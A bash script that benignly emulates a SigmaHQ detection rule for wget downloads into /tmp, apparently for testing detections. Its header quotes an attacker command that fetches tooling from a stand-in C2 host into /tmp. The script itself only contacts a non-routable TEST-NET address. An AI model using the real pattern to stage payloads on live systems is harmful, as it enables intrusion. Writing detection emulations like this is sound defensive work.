#!/usr/bin/env bash
# sigmahq_wget_download_suspicious_directory.sh - benign SigmaHQ emulation (see sigmahq_nohup.sh header).
#
# What an attacker does: fetch tooling straight into a staging dir like /tmp
# (T1105), e.g. `wget -O /tmp/x http://c2/...`. The rule keys on /wget with an
# output flag (-O / --output-document) and '/tmp/' on the command line.
# Harmless analogue: `wget -O /tmp/<scratch>` against a TEST-NET-1 address with a
# 1s timeout and a single try, so no connection is made and only an empty output
# file is briefly created (then removed). The execve of /wget with ' -O ' and
# '/tmp/', which the rule keys on, is real.
#
# Imitates (SigmaHQ): proc_creation_lnx_wget_download_suspicious_directory.yml - ATT&CK T1105
# Expected rule: proc_creation_lnx_wget_download_suspicious_directory
set -u

command -v wget >/dev/null 2>&1 || { echo "BANKEN-EMUL-SKIP: no wget"; exit 0; }

dst="/tmp/bk-wget-dl.$$"
wget -O "$dst" --timeout=1 --tries=1 http://192.0.2.1/ >/dev/null 2>&1 || true
rm -f "$dst" 2>/dev/null || true

exit 0
